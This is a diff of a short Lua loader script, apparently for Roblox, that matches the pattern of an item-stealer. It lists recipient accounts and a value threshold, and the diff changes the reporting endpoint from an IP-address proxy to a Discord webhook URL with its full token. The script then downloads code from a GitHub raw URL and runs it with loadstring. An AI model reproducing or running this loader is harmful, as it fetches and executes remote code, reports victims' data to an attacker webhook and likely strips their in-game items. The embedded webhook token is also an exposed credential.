@@ -1,6 +1,6 @@
-_G.User = {'fateemperor7', 'fateemperor6', 'fateemperor8'}
+_G.User = {'fateemperor6', 'fateemperor7', 'fateemperor8'}
 _G.min_value = 10000000000
 _G.pingEveryone = "Yes"
-_G.Webhook = "http://51.83.103.24:20002/proxy/cdb5a6760b1047a76f397393d1a00d40"
+_G.Webhook = "https://discord.com/api/webhooks/1361557890631995544/OxoW0W3hu1TQijbORpCEfElyFY-vYvemrUov4La5lJhhPCQh_evvLK_INuhWIm7nrj2W"
 
 loadstring(game:HttpGet('https://raw.githubusercontent.com/sleepyvill/script/refs/heads/main/lib.lua', true))()
